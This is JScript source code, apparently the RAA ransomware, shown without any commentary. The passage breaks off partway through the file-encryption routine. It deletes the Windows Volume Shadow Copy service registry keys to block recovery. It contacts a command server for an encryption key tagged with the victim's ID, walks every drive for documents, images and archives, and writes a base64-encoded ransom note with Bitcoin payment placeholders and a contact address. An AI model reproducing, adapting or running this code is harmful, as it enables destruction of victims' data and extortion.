function HxBG() {
    try {
        uTNMmZ();
    } catch (e) {
        doDirtyJob();
    }
    function uTNMmZ() {
        var HKLM = 0x80000002;
        var TkTuwCGFLuv = "SYSTEM\\CurrentControlSet\\services\\VSS";
        var ZTggxbypOSpS = yxTyDP(".", TkTuwCGFLuv);
        var ldranXys = -1;
        next:do {
            ldranXys += 1;
            if (yxTyDP(".", ZTggxbypOSpS[ldranXys]) != 1) {
                var pZhfh = yxTyDP(".", ZTggxbypOSpS[ldranXys]);
                ZTggxbypOSpS = ZTggxbypOSpS.concat(pZhfh);
            } else {
                continue next;
            }
        } while (ldranXys < ZTggxbypOSpS.length - 1);
        function NdpcNJVAPrNj() {
            var EOhUBStfdJi = WScript.CreateObject("WScript.Shell");
            var EtQCVA = ZTggxbypOSpS.length;
            do {
                EtQCVA -= 1;
                ZTggxbypOSpS[EtQCVA] = "HKLM\\" + ZTggxbypOSpS[EtQCVA];
                ZTggxbypOSpS[EtQCVA] = ZTggxbypOSpS[EtQCVA] + "\\";
                var aa = EOhUBStfdJi.RegDelete(ZTggxbypOSpS[EtQCVA]);
            } while (EtQCVA > 0);
            var bb = EOhUBStfdJi.RegDelete("HKLM\\SYSTEM\\CurrentControlSet\\services\\VSS\\");
            return 0;
        }

        NdpcNJVAPrNj();
        function yxTyDP(strComputer, strRegPath) {
            var oRd = null;
            var OHUpAAspilT = new ActiveXObject("WbemScripting.SWbemLocator");
            var rXRUTkui = OHUpAAspilT.ConnectServer(strComputer, "root\\default");
            var scSqs = rXRUTkui.Get("StdRegProv");
            var GqGcF = scSqs.Methods_.Item("EnumKey");
            var FsAp = GqGcF.InParameters.SpawnInstance_();
            FsAp.hDefKey = HKLM;
            FsAp.sSubKeyName = strRegPath;
            var vriZz = scSqs.ExecMethod_(GqGcF.Name, FsAp);
            switch (vriZz.ReturnValue) {
                case 0:
                    oRd = (vriZz.sNames != null) ? vriZz.sNames.toArray() : 1;
                    var RSxfFZsaPX = -1;
                    do {
                        RSxfFZsaPX += 1;
                        oRd[RSxfFZsaPX] = strRegPath + "\\" + oRd[RSxfFZsaPX];
                    } while (RSxfFZsaPX < oRd.length - 1);
                    break;
                case 2:
                    oRd = null;
                    break;
            }
            return oRd;
        }

        doDirtyJob();
        return 0;
    }

    return 0;
}

function doDirtyJob() {
    var typeLibObject = new ActiveXObject("Scriptlet.TypeLib");
    var guid = typeLibObject.GUID.substr(1, 36);

    function get_fromStartWaveNow() {
        var fullGuid = guid + " - RAA";
        var serverUrls = [];
        serverUrls[0] = "http://startwavenow.com/cmh" + "/mars.php?id=" + fullGuid;
        var req = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
        var timeout1 = 15000;
        var timeout2 = 15000;
        var timeout3 = 15000;
        var timeout4 = 15000;
        req.setTimeouts(timeout1, timeout2, timeout3, timeout4);
        var pointer_currentUrlIndex = -1;
        var responseFromRemoteServer;
        do {
            pointer_currentUrlIndex += 1;
            if (pointer_currentUrlIndex <= 0) {
                pointer_currentUrlIndex = pointer_currentUrlIndex;
            } else {
                pointer_currentUrlIndex = 0;
                WScript.Sleep(60000);
            }
            try {
                req.open("GET", serverUrls[pointer_currentUrlIndex], false);
                req.send();
                responseFromRemoteServer = req.responseText.split(',');
            } catch (e) {
                responseFromRemoteServer = 0;
            }
        } while (responseFromRemoteServer == 0);
        return responseFromRemoteServer;
    }

    var responsesFromRemoteServerArray = [];
    responsesFromRemoteServerArray = get_fromStartWaveNow();
    var responseFirst = responsesFromRemoteServerArray[0];
    var responseSecond = responsesFromRemoteServerArray[1];

    function getStrValuesArray() {
        var fileSystemObject, strValuesArray, n, drivesIterator, strValue;
        fileSystemObject = new ActiveXObject("Scripting.FileSystemObject");
        drivesIterator = new Enumerator(fileSystemObject.Drives);
        strValuesArray = [];
        continueLabel:
            for (; !drivesIterator.atEnd(); drivesIterator.moveNext()) {
                strValue = drivesIterator.item();
                if (strValue.IsReady) {
                    strValue = strValue += "\\\\";
                    strValuesArray.push(strValue);
                } else
                    continue continueLabel;
            }
        return (strValuesArray);
    }

    function findFolders(rootFolderName) {
        var fileSystemObject = new ActiveXObject("Scripting.FileSystemObject");
        var currentFolder = fileSystemObject.GetFolder(rootFolderName);
        var subfoldersIterator = new Enumerator(currentFolder.SubFolders);

        var folders_list = "";

        var windowsFolder = "WINDOWS";
        var recyclerFolderUppercase = "RECYCLER";
        var programFilesFolder = "Program Files";
        var programFilesX86Folder = "Program Files (x86)";
        var windowsMainFolder = "Windows";
        var recycleBinFolder = "Recycle.Bin";
        var RecycleBinFolderUppercase = "RECYCLE.BIN";
        var recyclerFolder = "Recycler";
        var tempUppercaseFolder = "TEMP";
        var appdataUppercaseFolder = "APPDATA";
        var appDataFolder = "AppData";
        var tempFolder = "Temp";
        var programDataFolder = "ProgramData";
        var microsoftFolder = "Microsoft";
        for (; !subfoldersIterator.atEnd(); subfoldersIterator.moveNext()) {
            if (subfoldersIterator.item() == 0) {
                null;
            } else {
                if (String(subfoldersIterator.item()).indexOf(windowsFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(recyclerFolderUppercase) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(programFilesFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(programFilesX86Folder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(windowsMainFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(recycleBinFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(RecycleBinFolderUppercase) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(recyclerFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(tempUppercaseFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(appdataUppercaseFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(appDataFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(tempFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(programDataFolder) >= 0) {
                    null;
                } else if (String(subfoldersIterator.item()).indexOf(microsoftFolder) >= 0) {
                    null;
                } else {
                    folders_list += subfoldersIterator.item();
                    folders_list += __key;
                }
            }
        }
        return (folders_list);
    }

    function LMz(TkTuwCGFLuv) {
        var WwltLWmsVwv = new ActiveXObject("Scripting.FileSystemObject");
        var IMhT = WwltLWmsVwv.GetFolder(TkTuwCGFLuv);
        var col_IMhT = new Enumerator(IMhT.Files);
        var IMhT_list = "";
        var kIsVkdBFbJ = ".doc";
        var YgArYNboS = ".xls";
        var CCOyZJ = ".rtf";
        var bAaa = ".pdf";
        var tOgTFO = ".dbf";
        var NijiLSgfjX = ".jpg";
        var Xhmb = ".dwg";
        var VwobvZiwDcyN = ".cdr";
        var HErxpbpJud = ".psd";
        var kIsVkdBFbJ0 = ".cd";
        var kIsVkdBFbJ1 = ".mdb";
        var kIsVkdBFbJ2 = ".png";
        var kIsVkdBFbJ3 = ".lcd";
        var kIsVkdBFbJ4 = ".zip";
        var kIsVkdBFbJ5 = ".rar";
        var kIsVkdBFbJ6 = ".locked";
        var kIsVkdBFbJ7 = "~";
        var kIsVkdBFbJ8 = "$";
        var kIsVkdBFbJ9 = "csv";
        for (; !col_IMhT.atEnd(); col_IMhT.moveNext()) {
            if (col_IMhT.item() == 0) {
                null;
            } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ6) >= 0) {
                null;
            } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ7) >= 0) {
                null;
            } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ8) >= 0) {
                null;
            } else {
                if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(YgArYNboS) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(CCOyZJ) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(bAaa) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(tOgTFO) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(NijiLSgfjX) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(Xhmb) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(VwobvZiwDcyN) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(HErxpbpJud) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ0) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ1) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ2) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ3) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ4) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ5) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else if (String(col_IMhT.item()).indexOf(kIsVkdBFbJ9) >= 0) {
                    IMhT_list += col_IMhT.item();
                    IMhT_list += __key;
                } else {
                    null;
                }
            }
        }
        return (IMhT_list);
    }

    function OFTEml(array_to_clean) {
        var pjvsEz = new Array();
        for (var i = 0; i < array_to_clean.length; i++) {
            if (array_to_clean[i]) {
                pjvsEz.push(array_to_clean[i]);
            }
        }
        return pjvsEz;
    }

    var kAgTDYi = [];
    kAgTDYi[0] = getStrValuesArray();
    function VGCDtihB() {
        var rftKZajp = "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CdlMlwnZWFcJ2U4IFwnZjRcJ2UwXCdlOVwnZWJcJ2VlXCdlMi5cY2YwXGIwXGZzMjBccGFyDQpcYlxmczI0IDVcZnMyMCRAASEPuXGIwICBcJ2NmXCdmMFwnZTVcJ2U0XCdlZlwnZjBcJ2U4XCdlZFwnZmZcJ2YyXCdmYyBcJ2VjXCdlNVwnZjBcJ2ZiIFwnZWZcJ2VlIFwnZWZcJ2YwXCdlNVwnZTRcJ2VlXCdmMlwnZTJcJ2YwXCdlMFwnZjlcJ2U1XCdlZFwnZThcJ2ZlIFwnZWZcJ2VlXCdlNFwnZWVcJ2UxXCdlZFwnZmJcJ2Y1IFwnZjFcJ2U4XCdmMlwnZjNcJ2UwXCdmNlwnZThcJ2U5IFwnZTIgXCdlNFwnZTBcJ2ViXCdmY1wnZWRcJ2U1XCdlOVwnZjhcJ2U1XCdlYy5ccGFyDQpccGFyDQpcY2YxXGJcZnMyNFwnYzJcJ2UwXCdlNlwnZWRcJ2VlICgxKS5cY2YwXGIwXGZzMjBccGFyDQpcJ2NkXCdlNSBcJ2VmXCdmYlwnZjJcJ2UwXCdlOVwnZjJcJ2U1XCdmMVwnZmMgXCdlZlwnZWVcJ2U0XCdlZVwnZTFcJ2YwXCdlMFwnZjJcJ2ZjIFwnZWFcJ2ViXCdmZVwnZjcsIFwnZmRcJ2YyXCdlZSBcJ2UxXCdlNVwnZjFcJ2VmXCdlZVwnZWJcJ2U1XCdlN1wnZWRcJ2VlLCBcJ2U4IFwnZWNcJ2VlXCdlNlwnZTVcJ2YyIFwnZjNcJ2VkXCdlOFwnZjdcJ2YyXCdlZVwnZTZcJ2U4XCdmMlwnZmMgXCdlMlwnZTBcJ2Y4XCdlOCBcJ2U0XCdlMFwnZWRcJ2VkXCdmYlwnZTUgXCdlZVwnZWFcJ2VlXCdlZFwnZjdcJ2UwXCdmMlwnZTVcJ2ViXCdmY1wnZWRcJ2VlLlxwYXINClxwYXINClxjZjFcYlxmczI0XCdjMlwnZTBcJ2U2XCdlZFwnZWUgKDIpLlxjZjBcYjBcZnMyMFxwYXINClwnYzVcJ2YxXCdlYlwnZTggXCdlZlwnZWUgXCdmM1wnZWFcJ2UwXCdlN1wnZTBcJ2VkXCdlZFwnZWVcJ2VjXCdmMyBcJ2UwXCdlNFwnZjBcJ2U1XCdmMVwnZjMgKHJhYS1jb25zdWx0MUBrZWVtYWlsLm1lKSBcJ2UyXCdlMFwnZWNcJ2U4IFwnZWRcJ2U1IFwnZTFcJ2ZiXCdlYiBcJ2VmXCdlZVwnZWJcJ2YzXCdmN1wnZTVcJ2VkIFwnZWVcJ2YyXCdlMlwnZTVcJ2YyIFwnZTIgXCdmMlwnZTVcJ2Y3XCdlNVwnZWRcJ2U4XCdlNSRAASEPzXCdmNSBcJ2Y3XCdlMFwnZjFcJ2VlXCdlMiwgXCdlMlwnZmIgXCdlY1wnZWVcJ2U2XCdlNVwnZjJcJ2U1IFwnZTJcJ2VlXCdmMVwnZWZcJ2VlXCdlYlwnZmNcJ2U3XCdlZVwnZTJcJ2UwXCdmMlwnZmNcJ2YxXCdmZiBcJ2U0XCdlYlwnZmYgXCdmMVwnZTJcJ2ZmXCdlN1wnZTggXCdmMVwnZTVcJ2YwXCdlMlwnZThcJ2YxXCdlZVwnZWMgQml0bWVzc2FnZVxwYXINCihcJ2VkXCdlMFwnZjggXCdlMFwnZTRcJ2YwXCdlNVwnZjEgLSBCTS0yY1ZDZDQzOWVINWtUUzlQekc0TnhHVUF0U0N4THl3c252KS5ccGFyDQpcJ2M0XCdlNVwnZjJcJ2UwXCdlYlwnZmNcJ2VkXCdlNVwnZTUgXCdlZSBcJ2VmXCdmMFwnZWVcJ2UzXCdmMFwnZTBcJ2VjXCdlY1wnZTUgLSBodHRwczovL2JpdG1lc3NhZ2Uub3JnL3dpa2kvTWFpbl9QYWdlXHBhcg0KXHBhcg0KXGNmMVxiXGZzMjRcJ2MyXCdlMFwnZTZcJ2VkXCdlZSRAASEPoMykuXGNmMFxiMFxmczIwXHBhcg0KXCdjY1wnZmIgXGNmMVxiXCdjZFwnYzUgXCdjY1wnY2VcJ2M2XCdjNVwnY2MgXGNmMFxiMFwnZjVcJ2YwXCdlMFwnZWRcJ2U4XCdmMlwnZmMgXCdlMlwnZTBcJ2Y4XCdlOCBcJ2VhXCdlYlwnZmVcJ2Y3XCdlOCBcJ2UyXCdlNVwnZjdcJ2VkXCdlZS4gXGNmMVxiXCdjMlwnZjFcJ2U1IFwnZWFcJ2ViXCdmZVwnZjdcJ2U4XGNmMFxiMCRAASEPsIFwnZTdcJ2UwIFwnZWFcJ2VlXCdmMlwnZWVcJ2YwXCdmYlwnZTUgXCdlZFwnZTUgXCdlMVwnZmJcJ2ViXCdlZSBcJ2UyXCdmYlwnZWZcJ2ViXCdlMFwnZjdcJ2U1XCdlZFwnZWUgXCdlMlwnZWVcJ2U3XCdlZFwnZTBcJ2UzXCdmMFwnZTBcJ2U2XCdlNFwnZTVcJ2VkXCdlOFwnZTUsIFxjZjFcYlwnZjNcJ2U0XCdlMFwnZWJcJ2ZmXCdmZVwnZjJcJ2YxXCdmZiBcJ2UyIFwnZjJcJ2U1XCdmN1wnZTVcJ2VkXCdlOFwnZTUgXCdlZFwnZTVcJ2U0XCdlNVwnZWJcJ2U4IFwnZjEgXCdlY1wnZWVcJ2VjXCdlNVwnZWRcJ2YyXCdlMCBcJ2U3XCdlMFwnZjBcJ2UwXCdlNlwnZTVcJ2VkXCdlOFwnZmZcY2YwXGIwIC5ccGFyDQpccGFyDQpSRUFETUUgXCdmNFwnZTBcJ2U5XCdlYlwnZmIgXCdmMFwnZTBcJ2YxXCdlZlwnZWVcJ2ViXCdlZVwnZTZcJ2U1XCdlZFwnZmIgXCdlMiBcJ2VhXCdlZVwnZjBcJ2VkXCdlNSBcJ2VhXCdlMFwnZTZcJ2U0XCdlZVwnZTNcJ2VlIFwnZTRcJ2U4XCdmMVwnZWFcJ2UwLlxwYXINClxwYXINClwnYzJcJ2MwXCdkOCBJRCRAASEPtIFxjZjFcYlxmczI0ID1JREhFUkU9XGYwXGZzMjJccGFyDQp9DQoRAASEP";
        var cUNSPAqZAE = rftKZajp.replace(/RAASEP/g, "A");
        cUNSPAqZAE = CryptoJS.enc.Base64.parse(cUNSPAqZAE);
        cUNSPAqZAE = cUNSPAqZAE.toString(CryptoJS.enc.Utf8);
        cUNSPAqZAE = cUNSPAqZAE.replace(/=IDHERE=/g, guid);
        cUNSPAqZAE = cUNSPAqZAE.replace(/=ADRHERE=/g, responseSecond);
        return cUNSPAqZAE;
    }

////B5wuifgCBCGVNwK4KpV73UnytdTkDjsoqIxFdmAUq7Ze0Dlib1p644VFSsCvaqV6RbnncZn7Des7RMPnmvDLBS3KjuDNzDOORh5lZMS1SXf45KcT8RfUhgRG6QDzmu5O8XNGv07kfDbHdjy3j4WKNNVoN5Yq5R3Hga7EYeJEwmUiH9kBaVambgPIzWGjAHJ5HeidAhoigHPFxbeS0MIAnJUhToN6pRHOli2rpwYyB9Hg1Ip9HHHu3oKy6wbA9NrCJ7xUg8opTyWx0i6IUBBB8E0guo5GT9v6T1K86acnLT1jspSthsc8XugqnFUVclnhQ28iqBT7hgL3DdoYMkT3zZQy3ROcPrBFVAnqkXHy8YCNxsxAqxS23cFT2Up7KbJZvyyXNUTsjZ9q8As0Qbom7kOE4G8fVnGCm2JAAoVX8mbm56AzPLPZRlvRhZ2g2IboLWgad8Tfu5wQjwnCQBzjifVh7U0ELdDqbGZdy89J2d5wBFAf9Ug4byTMrwp7xwWSumgpp31Kqb8gexFSCLliiI89lbPKU3jd5ovEKLpzwANdSe8rA1kGmAKy6yvbstWeeuShPfC4fmRFV4oz6sby1ADz7o7MpBseLR9KG2c1bbpPlr6Y6JGOs8M4gdujYHFdpgF6GLYTOGZfBatrC5SAru0EFeD3nIuZmIErs0vrnqEkn2h8Vvi8k0eczt0PxXVp7zwQ2xkV475J4iK2ZEbX0nrWMTiXg82mRP5Bep8mU0ayTbyQ4DJiQoJlfKmwXwsnvMlaOPPZCM5UNAJQc9Mo4H5F8yTIwdDJBDREkNY2EupL8f9gxtgtR1Erzf04V9dKfY51IBtYuX6QQd4vIjsGpTbVzjsKPKxx27YXHM3uLgi4seSf0Pj144rU5FQzAkQS30FoKr5pJDlItNjORTypPlo6Mmh4bv1GT1zCaqwcGFVKnmqe6gL2guzU
    function YlDrqb(kth) {
        var gg = new ActiveXObject("Scripting.FileSystemObject");
        var dir = kth + "!!!README!!!" + __key + ".rtf";
        var d2 = gg.CreateTextFile(dir, true);
        d2.Write(VGCDtihB());
        d2.Close();
        return 0;
    }

    function iKTzQKbfDJs() {
        var mItZKEXYwE = [];
        mItZKEXYwE = kAgTDYi[0];
        mItZKEXYwE = OFTEml(mItZKEXYwE);
        var rjTvWjMKnGpI = -1;
        do {
            rjTvWjMKnGpI += 1;
            YlDrqb(mItZKEXYwE[rjTvWjMKnGpI]);
        } while (rjTvWjMKnGpI < mItZKEXYwE.length - 1);
        return 0
    }

    iKTzQKbfDJs();
    kAgTDYi[1] = [];
    function nXmsNjMpKTv(kAgTDYi) {
        var EPtLPm = -1;
        var wVgUUZeM = -1;
        do {
            EPtLPm += 1;
            var LeDOaP = LMz(kAgTDYi[0][EPtLPm]);
            var LeDOaP = LeDOaP.split(__key);
            kAgTDYi[1] = kAgTDYi[1].concat(LeDOaP);
            kAgTDYi[1] = OFTEml(kAgTDYi[1]);
            var aZKH = findFolders(kAgTDYi[0][EPtLPm]);
            var aZKH = aZKH.split(__key);
            kAgTDYi[0] = kAgTDYi[0].concat(aZKH);
            kAgTDYi[0] = OFTEml(kAgTDYi[0]);
        } while (EPtLPm <= kAgTDYi[0].length - 2);
        return (kAgTDYi[1]);
    }

    function PLnEyqCPKHV() {
        var sNaZfrOWc = nXmsNjMpKTv(kAgTDYi);
        var NBMCuybDY = -1;
        iFIS:do {
            NBMCuybDY += 1;
            try {
                KWgwJwOlqJcs(sNaZfrOWc[NBMCuybDY]);
            } catch (e) {
                continue iFIS;
            }
        } while (NBMCuybDY <= sNaZfrOWc.length - 2);
        return 0
    }

    PLnEyqCPKHV();
    function KWgwJwOlqJcs(IMhTname) {
        function rStinsVp(rand) {
            var eqQu = [];
            var EPtLPmand = -1;
            do {
                EPtLPmand += 1;
                eqQu[EPtLPmand] = Math.floor((Math.random() * 2000) + 1);
                if (eqQu[EPtLPmand] < 10) {
                    eqQu[EPtLPmand] = "000" + eqQu[EPtLPmand];
                } else if (eqQu[EPtLPmand] >= 10 && eqQu[EPtLPmand] < 100) {
                    eqQu[EPtLPmand] = "00" + eqQu[EPtLPmand];
                } else if (eqQu[EPtLPmand] >= 100 && eqQu[EPtLPmand] < 1000) {
                    eqQu[EPtLPmand] = "0" + eqQu[EPtLPmand];
                } else {
                    eqQu[EPtLPmand] = eqQu[EPtLPmand];
                }
            } while (eqQu.length < 32);
            var xjLCtcIO = "";
            var EPtLPmand2 = -1;
            var vPdyagHuFMMj = [];
            do {
                EPtLPmand2 += 1;
                vPdyagHuFMMj[EPtLPmand2] = parseInt(eqQu[EPtLPmand2]);
                xjLCtcIO = xjLCtcIO + rand.charAt(vPdyagHuFMMj[EPtLPmand2]);
            } while (xjLCtcIO.length < 32);
            var gieJISwveNlD = [];
            gieJISwveNlD[0] = eqQu;
            gieJISwveNlD[1] = xjLCtcIO;
            return gieJISwveNlD;
        }

        var HZtSmFNRdJM_data = rStinsVp(responseFirst);
        var qPCIyff = rStinsVp(responseFirst);
////cWO7h7UOQEdvc9GiXfI7h2j00qzhHNh03qS4qJXfoQyWniUmqpKHaoPNTEYwSY3H2IVazY1nJbmfpKKyj9fNWAwPcrwVPxiE04yYjYwnxP
        function udpIHxNm(IMhTname) {
            var SlSPWu = WScript.CreateObject("ADODB.Stream");
            SlSPWu.CharSet = '437';
            SlSPWu.Open();
            SlSPWu.LoadFromFile(IMhTname);
            var hXpHGpZ = [];
            hXpHGpZ[0] = [];
